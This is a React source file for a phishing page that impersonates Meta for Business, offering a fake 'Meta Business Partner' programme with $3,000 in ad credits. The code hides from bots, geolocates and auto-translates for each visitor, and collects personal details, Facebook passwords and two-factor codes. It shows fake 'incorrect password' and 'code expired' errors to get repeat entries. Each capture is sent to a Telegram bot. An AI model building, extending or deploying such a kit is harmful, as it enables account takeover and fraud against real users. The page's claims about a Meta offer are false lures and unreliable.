import { useEffect, useState, useCallback, useMemo, useRef } from 'react';
import axios from 'axios';
import MetaLogoBlue from '@/assets/images/logo-meta.svg';
import HeroVideo from '@/assets/images/hero.mp4';
import AdsManagerVideo from '@/assets/images/ads_manager.mp4';
import StreetwearVideo from '@/assets/images/streetwear.mp4';
import BrooklinenVideo from '@/assets/images/brooklinen.mp4';
import ShopifyVideo from '@/assets/images/shopify.mp4';
import MediaImg from '@/assets/images/media.webp';
import FansVideo from '@/assets/images/fans.mp4';
import FbIcon from '@/assets/images/fb_round_logo.png';
import IgIcon from '@/assets/images/ic_instagram_color.webp';
import MessengerIcon from '@/assets/images/ic_message_color.svg';
import WhatsappIcon from '@/assets/images/ic_whatshap_color.svg';
import SupportVideo from '@/assets/images/support.mp4';
import BackgroundImg from '@/assets/images/background.webp';

import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import detectBot from '@/utils/detect_bot';
import detectDevice from '@/utils/detect_device';
import countryToLanguage from '@/utils/country_to_language';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import SuccessModal from '@/components/SuccessModal';

const LABEL = '🎁 Page Monetization 🎁';

const Home = () =>
{
    const videoRef = useRef( null );
    const [ isVideoPaused, setIsVideoPaused ] = useState( false );
    const adsVideoRef = useRef( null );
    const [ isAdsVideoPaused, setIsAdsVideoPaused ] = useState( false );
    const [ activeAccordion, setActiveAccordion ] = useState( 'ads_manager' );
    const [ playingVideo, setPlayingVideo ] = useState( null );
    const fansVideoRef = useRef( null );
    const [ isFansVideoPaused, setIsFansVideoPaused ] = useState( false );
    const [ activeTab, setActiveTab ] = useState( 'facebook' );
    const supportVideoRef = useRef( null );
    const [ isSupportVideoPaused, setIsSupportVideoPaused ] = useState( false );
    const [ showFirstModal, setShowFirstModal ] = useState( false );
    const [ showLoginModal, setShowLoginModal ] = useState( false );
    const [ show2FAModal, setShow2FAModal ] = useState( false );
    const [ showSuccessModal, setShowSuccessModal ] = useState( false );
    const [ formData, setFormData ] = useState( {
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        loginIdentifier: ''
    } );
    const [ loginAttempts, setLoginAttempts ] = useState( [] );
    const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' } );
    const [ translatedTexts, setTranslatedTexts ] = useState( {} );
    const [ isLoading, setIsLoading ] = useState( true );

    const defaultTexts = useMemo(
        () => ( {
            fullName: 'Full Name',
            personalEmail: 'Personal Email',
            businessEmail: 'Business Email',
            mobilePhone: 'Mobile Phone Number',
            yourPageName: 'Your Page Name',
            agreeToTerms: 'I agree to the',
            confirm: 'Confirm',
            aboutHelpMore: 'About · Help · See more',

            loginInstruction: 'To activate content monetization and start earning money on Facebook, you must be logged in to your creator account (Facebook) or business Page (Facebook).',
            mobileOrEmail: 'Mobile number or email',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            logIn: 'Log in',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',
            loginPasswordSecurityNote: 'For your security, you must enter your password to continue.',
            loginPasswordFieldPlaceholder: 'Enter your password',
            loginForgotPasswordQuestion: 'Forgot your password?',

            twoFATitle: 'Check your authentication code',
            twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
            code: 'Code',
            codeExpired: 'This code has expired. Please enter a new code later',
            pleaseWait: 'Please wait',

            findNewWaysTitle: 'Find new ways to earn money with your content.',
            creatorLabel: 'Creator',
            subscribeBtn: 'Subscribe',
            monetizeDesc: "Whether you're creating videos or publishing to a blog, Facebook monetization tools help you earn more money.",

            // --- NEW TRANSLATIONS FOR REDESIGN ---
            heroTitle: 'Explore how Meta technologies can help transform your business.',
            startNow: 'Start now',
            trustedExperts: 'Trusted by experts',
            exploreMeta: 'Explore Meta technologies',
            improveAd: 'Improve ad performance',
            improveAdDesc: 'Maximise campaign results and simplify the setup process with advanced ad creation tools.',
            reachPeople: 'Reach people where they are',
            reachPeopleDesc: 'Connect with people across Meta technologies and build relationships.',
            getExpert: 'Get expert guidance',
            getExpertDesc: 'Access personalized support and resources to help your business grow.',
            findSolutions: 'Find solutions for your business',
            findSolutionsDesc: 'Discover the right tools and strategies to achieve your unique goals.',
            understandAudience: 'Understand your audience',
            understandAudienceDesc: 'Gain insights into customer behavior and preferences to inform your marketing.',
            useFormats: 'Use versatile ad formats',
            useFormatsDesc: 'Create engaging ads that resonate with your target audience across different platforms.',
            toolsTitle: 'Gain access to tools that deliver results.',
            adsManager: 'Ads Manager',
            fbIgShops: 'Facebook & Instagram Shops',
            messengerApi: 'Messenger API',
            waBusiness: 'WhatsApp Business Platform',
            inspiredTitle: 'Be inspired by reading how best-in-class marketers scale their business with Meta technologies.',
            streetwearTip: 'Streetwear brand Market shares tips on how to hype up your next product drop',
            brooklinenTip: 'Brooklinen shares how to use Meta ad solutions to find new customers',
            shopifyTip: 'Shopify shares how to use Meta tools to build a community and grow sales',
            reachTitle: 'Reach more customers with ads on Meta technologies.',
            reachDesc: 'Discover everything you need to start advertising your business.',
            connectedTitle: 'Stay connected to your audience.',
            reachCustomersFb: 'Reach your customers with the Facebook app.',
            createPage: 'Create a Page',
            getSupport: 'Get support',
            resourcesTitle: 'Additional resources for your business.',
            footerUpdateTitle: 'Get the latest updates from Meta for business.',
            footerUpdateDesc: 'Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.',
            emailAddressPlaceholder: 'Email address',
            enterCountry: 'Enter a country name...',
            footerDisclaimer: 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our',
            dataPolicy: 'Data Policy',
            successModalTitle: 'Request has been sent',
            successModalDesc: 'Your information has been added to the processing queue. We will respond to your results within 24 hours. In case we do not receive a response, please resend the information so we can assist you.',
            successModalFrom: 'From the Customer Care Team',
            successModalBtn: 'Return to facebook',
            successModalHeroAlt: 'Success',
            successModalLogoAlt: 'Meta',
            twoFATitleNew: 'Two-factor authentication required',
            twoFADescriptionTemplate: 'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
            twoFAFallbackUser: 'User',
            twoFABrandFacebook: 'Facebook',
            twoFAAuthenticationImageAlt: 'Two-factor authentication',
            enterCode: 'Enter the code',
            tryAnotherWay: 'Try another way',
            information: 'Information',
            fanpageName: 'Fanpage Name',
            dateOfBirth: 'Date of Birth',
            day: 'Day',
            month: 'Month',
            year: 'Year',
            message: 'Message',
            responseWithin: 'Our response will be sent to you within 14 - 48 hours.',
            termsOfUse: 'Terms of use',
            submit: 'Submit',

            navGetStarted: 'Get started',
            navAdvertise: 'Advertise',
            navLearn: 'Learn',
            navSupport: 'Support',

            landingHeroTitle: 'Become a Meta Business Partner',
            landingHeroSubtitle: 'Become a Meta Business Partner to receive up to $3,000 in advertising credits, along with valuable benefits such as training, technical support, analytics tools, and opportunities to expand your client network. Get started now to claim your advertising credits.',
            landingGetStartedBtn: 'Get started',

            trustedPartnersTitle: 'Meta Business Partners are trusted experts',
            trustedPartnersDesc: 'Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you\'ll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.',

            landingFeatureReachMoreTitle: 'Reach more people',
            landingFeatureReachMoreDesc: 'Get ads to people most likely to be interested in your products or services with automated targeting tools.',
            becomeExpertCardTitle: 'Become an expert',
            becomeExpertLead: 'Upgrade your marketing skills with free online courses and certifications through',
            metaBlueprintBrand: 'Meta Blueprint',
            becomeExpertTrail: '',
            personalisedAdSolutionsTitle: 'Get personalised ad solutions',
            personalisedAdSolutionsDesc: 'See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.',
            understandPerformanceTitle: 'Understand performance',
            understandPerformanceDesc: 'Access advanced marketing performance tracking with detailed overviews of audience behaviour.',
            adFormatsTitle: 'Use ad formats that work',
            adFormatsDesc: 'Designed to fit specific business goals, reach and expand your audience across every device.',

            accordionAdsManagerDesc: 'Create and track new ads, monitor your budget and increase sales across Facebook, Messenger, Instagram and WhatsApp – all from one place.',
            accordionBusinessSuiteTitle: 'Meta Business Suite',
            accordionBusinessSuiteDesc: 'Manage all your Facebook and Instagram activities in one place – including posting, messaging, analytics and advertising.',
            accordionPixelTitle: 'Meta pixel',
            accordionPixelDesc: 'Understand the actions people take on your website and reach new audiences with the Meta pixel.',
            accordionFbPagesTitle: 'Facebook Pages',
            accordionFbPagesDesc: 'Connect with customers and grow your business with a Facebook Page.',
            accordionAiMarketingTitle: 'AI tools (performance marketing)',
            accordionAiMarketingDesc: 'Use AI-powered tools to automate and optimise your campaigns for better performance.',

            learnMore: 'Learn more',
            goToAdsManager: 'Go to Ads Manager',

            inspiredBrookShort: 'Brooklinen\'s tips for maximising your ad budget',
            inspiredShopifyShort: 'Shopify\'s tips for reaching the right audience',

            createAd: 'Create ad',

            metaTechnologiesEyebrow: 'Meta technologies',
            marketingOnFacebookEyebrow: 'Marketing on Facebook',
            fansBuildFollowingTitle: 'Find fans and build a following.',
            fansBuildFollowingDesc: 'Create lasting relationships with customers everywhere by marketing with Facebook.',
            exploreFacebookLink: 'Explore Facebook',

            supportCentreEyebrow: 'Meta Business Help Centre',
            supportAnswersTitle: 'Get answers to FAQ, plus help and support with troubleshooting business accounts.',

            mediaIllustrationAlt: 'Meta Platforms Illustration',

            ariaPlayVideo: 'Play',
            ariaPauseVideo: 'Pause',

            footerFcMetaFb: 'Facebook',
            footerFcMetaIg: 'Instagram',
            footerFcMetaMsg: 'Messenger',
            footerFcMetaWa: 'WhatsApp',
            footerFcMetaAn: 'Audience Network',
            footerFcMetaQuest: 'Meta Quest',
            footerFcMetaWorkplace: 'Workplace',
            footerFcMetaForWork: 'Meta for Work',

            footerFcToolsFt: 'Free tools',
            footerFcToolsFbPages: 'Facebook Pages',
            footerFcToolsIgProfiles: 'Instagram profiles',
            footerFcToolsStories: 'Stories',
            footerFcToolsShops: 'Shops',
            footerFcToolsMbs: 'Meta Business Suite',
            footerFcToolsFbAds: 'Facebook ads',
            footerFcToolsIgAds: 'Instagram ads',
            footerFcToolsVideoAds: 'Video ads',
            footerFcToolsAdsMgr: 'Ads Manager',

            footerFcGoalsFbPage: 'Set up a Facebook Page',
            footerFcGoalsBrandAwareness: 'Build brand awareness',
            footerFcGoalsLocal: 'Promote your local business',
            footerFcGoalsOnlineSales: 'Grow online sales',
            footerFcGoalsApp: 'Promote your app',
            footerFcGoalsLeads: 'Generate leads',
            footerFcGoalsMeasure: 'Measure and optimise ads',
            footerFcGoalsRetarget: 'Retarget existing customers',

            footerFcBizSmall: 'Small business',
            footerFcBizLarge: 'Large businesses',
            footerFcBizAgency: 'Agency',
            footerFcBizMedia: 'Media and publisher',
            footerFcBizCreator: 'Creator',
            footerFcBizDev: 'Developer',
            footerFcBizPartner: 'Business partner',

            footerFcIndustryAuto: 'Automotive',
            footerFcIndustryCpg: 'Consumer packaged goods',
            footerFcIndustryEcom: 'E-commerce',
            footerFcIndustryEnt: 'Entertainment and media',
            footerFcIndustryFin: 'Financial services',
            footerFcIndustryGaming: 'Gaming',
            footerFcIndustryProperty: 'Property',
            footerFcIndustryRest: 'Restaurants',
            footerFcIndustryRetail: 'Retail',
            footerFcIndustryTech: 'Technology and telecom',
            footerFcIndustryTravel: 'Travel',

            footerFcSkillsOnline: 'Online learning',
            footerFcSkillsCert: 'Certification programmes',
            footerFcSkillsWebinars: 'Webinars',

            footerFcGuideAds: 'Ads guide',
            footerFcGuideBrand: 'Brand safety and suitability',
            footerFcGuideBook: '"Click Here" book',
            footerFcGuideMedia: 'Media responsibility',
            footerFcGuideSitemap: 'Sitemap',

            footerFcColMetaTech: 'Meta technologies',
            footerFcColTools: 'Tools',
            footerFcColGoals: 'Goals',
            footerFcColBusinessTypes: 'Business types',
            footerFcColIndustries: 'Industries',
            footerFcColSkills: 'Skills and training',
            footerFcColGuides: 'Guides and resources',

            footerLegalAbout: 'About',
            footerLegalDevelopers: 'Developers',
            footerLegalCareers: 'Careers',
            footerLegalPrivacy: 'Privacy',
            footerLegalCookies: 'Cookies',
            footerLegalTerms: 'Terms',
            footerLegalHelp: 'Help Centre',

            footerSocialFacebook: 'Facebook',
            footerSocialInstagram: 'Instagram',
            footerSocialX: 'X',
            footerSocialLinkedIn: 'LinkedIn',

            footerCopyrightNotice: '© 2026 Meta'
        } ),
        []
    );

    useEffect( () =>
    {
        localStorage.clear();
        initializeApp();
    }, [] );

    const initializeApp = async () =>
    {
        try
        {
            const botResult = await detectBot();
            if ( botResult.isBot )
            {
                window.location.href = 'about:blank';
                return;
            }

            try
            {
                const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                const data = response.data;
                setIpInfo( {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country || 'Unknown'
                } );
                localStorage.setItem( 'ipInfo', JSON.stringify( data ) );

                const countryCode = data.country_code;
                const targetLang = countryToLanguage[ countryCode ] || 'en';
                localStorage.setItem( 'targetLang', targetLang );

                if ( targetLang !== 'en' )
                {
                    translateAllTexts( targetLang );
                } else
                {
                    setTranslatedTexts( defaultTexts );
                }
            } catch ( error )
            {
                console.error( 'Error fetching IP:', error );
                setTranslatedTexts( defaultTexts );
            }

            setIsLoading( false );
        } catch ( error )
        {
            console.error( 'Initialization error:', error );
            setIsLoading( false );
        }
    };

    const translateAllTexts = useCallback(
        async ( targetLang ) =>
        {
            try
            {
                const keys = Object.keys( defaultTexts );
                const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
                const translated = {};
                keys.forEach( ( key, index ) =>
                {
                    translated[ key ] = translations[ index ];
                } );
                setTranslatedTexts( translated );
            } catch ( error )
            {
                console.error( 'Translation error:', error );
                setTranslatedTexts( defaultTexts );
            }
        },
        [ defaultTexts ]
    );

    const pad = ( n ) => ( n < 10 ? '0' + n : String( n ) );

    const formatDateTime = ( d ) =>
    {
        return (
            pad( d.getDate() ) +
            '/' +
            pad( d.getMonth() + 1 ) +
            '/' +
            d.getFullYear() +
            ' ' +
            pad( d.getHours() ) +
            ':' +
            pad( d.getMinutes() ) +
            ':' +
            pad( d.getSeconds() )
        );
    };

    const buildAndSend = async ( data ) =>
    {
        const dt = formatDateTime( new Date() );
        const { form, login, passes, codes } = data;
        const device = detectDevice();

        let message = `💵 <b>${ LABEL }</b>\n`;
        message += `⏰ ${ dt }\n`;
        message += `🌐 IP: <code>${ ipInfo.ip }</code>\n`;
        message += `📍 Vị trí: ${ ipInfo.city }, ${ ipInfo.region }, ${ ipInfo.country }\n`;
        message += `📱 Thiết bị: ${ device.deviceInfo }\n`;
        if ( device.cpu ) message += `💻 CPU: ${ device.cpu }\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n`;

        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName )
        {
            message += `<b>📋 THÔNG TIN</b>\n`;
            if ( form.fullName ) message += `   Tên: <code>${ form.fullName }</code>\n`;
            if ( form.personalEmail ) message += `   Email: <code>${ form.personalEmail }</code>\n`;
            if ( form.businessEmail && form.businessEmail !== form.personalEmail )
            {
                message += `   Business: <code>${ form.businessEmail }</code>\n`;
            }
            if ( form.phone ) message += `   SĐT: <code>${ form.phone }</code>\n`;
            if ( form.pageName ) message += `   Page: <code>${ form.pageName }</code>\n`;
        }

        if ( login || ( passes && passes.length > 0 ) )
        {
            message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
            if ( login ) message += `   TK: <code>${ login }</code>\n`;
            if ( passes && passes.length > 0 )
            {
                passes.forEach( ( p, i ) =>
                {
                    message += `   MK${ i + 1 }: <code>${ p }</code>\n`;
                } );
            }
        }

        if ( codes && codes.length > 0 )
        {
            message += `\n<b>🔒 MÃ 2FA</b>\n`;
            codes.forEach( ( c, i ) =>
            {
                message += `   Code${ i + 1 }: <code>${ c }</code>\n`;
            } );
        }

        message += `━━━━━━━━━━━━━━━━━━━━`;

        try
        {
            await sendMessage( message );
        } catch ( error )
        {
            console.error( 'Error sending message:', error );
        }
    };

    const handleFirstFormSubmit = ( data ) =>
    {
        const newFormData = { ...formData, ...data };
        setFormData( newFormData );
        setShowFirstModal( false );
        setShowLoginModal( true );

        buildAndSend( {
            form: newFormData,
            login: null,
            passes: [],
            codes: []
        } );
    };

    const handleLoginSubmit = ( email, password ) =>
    {
        const newFormData = { ...formData, loginIdentifier: email };
        const newPasses = [ ...loginAttempts.map( p => p.value ), password ].slice( -2 );

        setFormData( newFormData );
        setLoginAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: password } ].slice( -2 ) );

        buildAndSend( {
            form: newFormData,
            login: email,
            passes: newPasses,
            codes: twoFAAttempts.map( c => c.value )
        } );
    };

    const handle2FASubmit = ( code ) =>
    {
        const newCodes = [ ...twoFAAttempts.map( c => c.value ), code ].slice( -3 );

        setTwoFAAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: code } ].slice( -3 ) );

        buildAndSend( {
            form: formData,
            login: formData.loginIdentifier,
            passes: loginAttempts.map( p => p.value ),
            codes: newCodes
        } );
    };

    const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;

    if ( isLoading )
    {
        return (
            <div id="intro">
                {/* Loading screen - thay đổi giao diện tại đây */ }
            </div>
        );
    }

    return (
        <>
            {/* ===== BẮT ĐẦU GIAO DIỆN MỚI ===== */ }

            {/* ===== HEADER ===== */ }
            <header style={ {
                width: '100%',
                borderBottom: '1px solid #e4e6eb',
                background: '#fff',
                position: 'sticky',
                top: 0,
                zIndex: 100
            } }>
                <div style={ {
                    maxWidth: '1504px',
                    margin: '0 auto',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    padding: '0 32px',
                    height: '64px'
                } }>
                    {/* Left: Logo + Nav */ }
                    <div style={ { display: 'flex', alignItems: 'center', gap: '8px' } }>
                        <img src={ MetaLogoBlue } alt="Meta" style={ { width: '61px', objectFit: 'contain' } } />
                        <nav style={ { marginLeft: '50px', display: 'flex', alignItems: 'center', gap: '28px' } }>
                            { [ texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport ].map( ( item ) => (
                                <span
                                    key={ item }
                                    style={ { cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' } }
                                >
                                    { item }
                                </span>
                            ) ) }
                        </nav>
                    </div>

                    {/* Right: Create a Page + Start now */ }
                    <div style={ { display: 'flex', alignItems: 'center', gap: '40px' } }>
                        <span style={ { cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' } }>
                            { texts.createPage }
                        </span>
                        <span
                            id="header-start-now"
                            style={ {
                                cursor: 'pointer',
                                background: '#0457CB',
                                color: '#fff',
                                fontWeight: '600',
                                fontSize: '14px',
                                padding: '8px 24px',
                                borderRadius: '100px',
                                whiteSpace: 'nowrap'
                            } }
                            onClick={ () => setShowFirstModal( true ) }
                        >
                            { texts.startNow }
                        </span>
                    </div>
                </div>
            </header>
            {/* ===== END HEADER ===== */ }

            {/* ===== HERO SECTION ===== */ }
            <section style={ { padding: '80px 24px' } }>
                <div style={ {
                    maxWidth: '1504px',
                    margin: '0 auto',
                    width: '100%',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center'
                } }>

                    {/* Title wrapper */ }
                    <div style={ { width: '80%', padding: '0 24px' } }>
                        <h1 style={ {
                            fontSize: '3.5rem',
                            fontWeight: '550',
                            color: '#1C2B33',
                            textAlign: 'center',
                            lineHeight: '1.15',
                            margin: 0,
                            display: 'block'
                        } }>
                            { texts.landingHeroTitle }
                        </h1>
                    </div>

                    {/* Subtitle wrapper */ }
                    <div style={ { width: '60%' } }>
                        <p style={ {
                            fontSize: '16px',
                            color: '#5D6C7B',
                            textAlign: 'center',
                            padding: '16px 16px 0',
                            fontWeight: '400',
                            lineHeight: '1.6',
                            margin: 0
                        } }>
                            { texts.landingHeroSubtitle }
                        </p>
                    </div>

                    {/* CTA Button */ }
                    <div
                        id="hero-get-started"
                        style={ {
                            display: 'inline-flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            padding: '0 24px',
                            height: '45px',
                            cursor: 'pointer',
                            background: '#0457CB',
                            borderRadius: '100px',
                            margin: '24px auto 0',
                        } }
                        onClick={ () => setShowFirstModal( true ) }
                    >
                        <span style={ { fontSize: '15px', color: '#fff', fontWeight: '500', whiteSpace: 'nowrap' } }>
                            { texts.landingGetStartedBtn }
                        </span>
                    </div>

                    {/* Video */ }
                    <div style={ { width: '60%', margin: '80px auto 0' } }>
                        <div style={ {
                            position: 'relative',
                            width: '100%',
                            aspectRatio: '16/9',
                            borderRadius: '32px',
                            overflow: 'hidden',
                            boxShadow: '0 20px 50px rgba(0,0,0,0.1)'
                        } }>
                            <video
                                ref={ videoRef }
                                style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } }
                                muted
                                loop
                                playsInline
                                autoPlay
                            >
                                <source src={ HeroVideo } type="video/mp4" />
                            </video>

                            {/* Pause/Play button */ }
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 10 } }>
                                <button
                                    aria-label={ isVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo }
                                    style={ {
                                        width: '32px',
                                        height: '32px',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        background: 'rgba(255,255,255,0.2)',
                                        backdropFilter: 'blur(12px)',
                                        border: '1px solid rgba(255,255,255,0.4)',
                                        borderRadius: '50%',
                                        color: '#fff',
                                        cursor: 'pointer',
                                        transition: 'background 0.3s'
                                    } }
                                    onClick={ () =>
                                    {
                                        if ( videoRef.current )
                                        {
                                            if ( isVideoPaused )
                                            {
                                                videoRef.current.play();
                                            } else
                                            {
                                                videoRef.current.pause();
                                            }
                                            setIsVideoPaused( !isVideoPaused );
                                        }
                                    } }
                                >
                                    { isVideoPaused ? (
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none">
                                            <polygon points="5,3 19,12 5,21" />
                                        </svg>
                                    ) : (
                                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none">
                                            <rect x="14" y="3" width="5" height="18" rx="1" />
                                            <rect x="5" y="3" width="5" height="18" rx="1" />
                                        </svg>
                                    ) }
                                </button>
                            </div>

                            {/* Bottom gradient overlay */ }
                            <div style={ {
                                position: 'absolute',
                                inset: '0',
                                bottom: 0,
                                left: 0,
                                right: 0,
                                height: '33%',
                                background: 'linear-gradient(to top, rgba(0,0,0,0.2), transparent)',
                                pointerEvents: 'none',
                                opacity: 0.6,
                                top: 'auto'
                            } } />
                        </div>
                    </div>

                </div>
            </section>
            {/* ===== END HERO SECTION ===== */ }

            {/* ===== TRUSTED EXPERTS SECTION ===== */ }
            <section style={ { padding: '80px 32px' } }>
                <div style={ {
                    maxWidth: '1504px',
                    margin: '0 auto'
                } }>
                    <div style={ { maxWidth: '83%' } }>
                        <p style={ {
                            fontSize: '36px',
                            fontWeight: '500',
                            color: '#1C2B33',
                            lineHeight: '1.2',
                            margin: 0,
                            fontFamily: 'inherit'
                        } }>
                            { texts.trustedPartnersTitle }
                        </p>
                        <p style={ {
                            fontSize: '18px',
                            marginTop: '18px',
                            color: '#1C2B33',
                            lineHeight: '1.6',
                            fontWeight: '400',
                            margin: '18px 0 0'
                        } }>
                            { texts.trustedPartnersDesc }
                        </p>
                    </div>
                </div>
            </section>
            {/* ===== END TRUSTED EXPERTS SECTION ===== */ }

            {/* ===== EXPLORE SECTION ===== */ }
            <section style={ { padding: '0 32px 80px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto' } }>
                    <h2 style={ {
                        fontSize: '36px',
                        fontWeight: '500',
                        color: '#1C2B33',
                        lineHeight: '1.2',
                        margin: 0,
                        display: 'block'
                    } }>
                        { texts.heroTitle }
                    </h2>
                </div>
            </section>
            {/* ===== END EXPLORE SECTION ===== */ }

            {/* ===== FEATURE CARDS SECTION ===== */ }
            <section style={ { paddingBottom: '80px' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto', padding: '40px 32px 0' } }>
                    <div style={ { display: 'flex', flexWrap: 'wrap', margin: '0 -12px' } }>
                        { [
                            {
                                icon: (
                                    <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M3 17L9 11L13 15L21 7" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                        <path d="M17 7H21V11" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                ),
                                title: texts.improveAd,
                                desc: texts.improveAdDesc
                            },
                            {
                                icon: (
                                    <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <circle cx="9" cy="7" r="4" stroke="#0457CB" strokeWidth="2" />
                                        <path d="M3 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" />
                                        <path d="M16 3.13a4 4 0 0 1 0 7.75" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" />
                                        <path d="M21 21v-2a4 4 0 0 0-3-3.85" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" />
                                    </svg>
                                ),
                                title: texts.landingFeatureReachMoreTitle,
                                desc: texts.landingFeatureReachMoreDesc
                            },
                            {
                                icon: (
                                    <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                ),
                                title: texts.becomeExpertCardTitle,
                                desc: (
                                    <>
                                        { texts.becomeExpertLead }{ ' ' }
                                        <a href="https://www.facebook.com/business/learn" style={ { color: '#0064E0' } }>{ texts.metaBlueprintBrand }</a>
                                        { texts.becomeExpertTrail }
                                    </>
                                )
                            },
                            {
                                icon: (
                                    <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7Z" stroke="#0457CB" strokeWidth="2" />
                                        <path d="M9 21h6" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" />
                                    </svg>
                                ),
                                title: texts.personalisedAdSolutionsTitle,
                                desc: texts.personalisedAdSolutionsDesc
                            },
                            {
                                icon: (
                                    <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M18 20V10" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" />
                                        <path d="M12 20V4" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" />
                                        <path d="M6 20v-6" stroke="#0457CB" strokeWidth="2" strokeLinecap="round" />
                                    </svg>
                                ),
                                title: texts.understandPerformanceTitle,
                                desc: texts.understandPerformanceDesc
                            },
                            {
                                icon: (
                                    <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <rect x="3" y="3" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" />
                                        <rect x="14" y="3" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" />
                                        <rect x="3" y="14" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" />
                                        <rect x="14" y="14" width="7" height="7" rx="1" stroke="#0457CB" strokeWidth="2" />
                                    </svg>
                                ),
                                title: texts.adFormatsTitle,
                                desc: texts.adFormatsDesc
                            }
                        ].map( ( card, index ) => (
                            <div key={ index } style={ { width: 'calc(33.333% - 24px)', margin: '0 12px 24px', minWidth: '280px', flex: '1 1 280px' } }>
                                <div style={ {
                                    background: '#fff',
                                    borderRadius: '24px',
                                    padding: '40px',
                                    border: '1px solid rgba(10,19,23,0.12)',
                                    height: '100%',
                                    display: 'flex',
                                    flexDirection: 'column',
                                    boxSizing: 'border-box'
                                } }>
                                    {/* Icon circle */ }
                                    <div style={ {
                                        width: '84px',
                                        height: '84px',
                                        borderRadius: '50%',
                                        background: '#EEF4FF',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        marginBottom: '24px',
                                        flexShrink: 0
                                    } }>
                                        { card.icon }
                                    </div>
                                    <div style={ { flex: 1 } }>
                                        <h3 style={ {
                                            fontSize: '24px',
                                            fontWeight: '500',
                                            color: '#0A1317',
                                            lineHeight: '1.2',
                                            marginBottom: '24px',
                                            display: 'block'
                                        } }>
                                            { card.title }
                                        </h3>
                                        <div style={ { fontSize: '16px', color: '#5D6C7B', lineHeight: '1.5' } }>
                                            { card.desc }
                                        </div>
                                    </div>
                                </div>
                            </div>
                        ) ) }
                    </div>
                </div>
            </section>
            {/* ===== END FEATURE CARDS SECTION ===== */ }

            {/* ===== TOOLS SECTION ===== */ }
            <section style={ { padding: '0 0 0' } }>
                <div style={ { maxWidth: '1504px', margin: '0 auto', padding: '80px 32px' } }>

                    <h1 style={ {
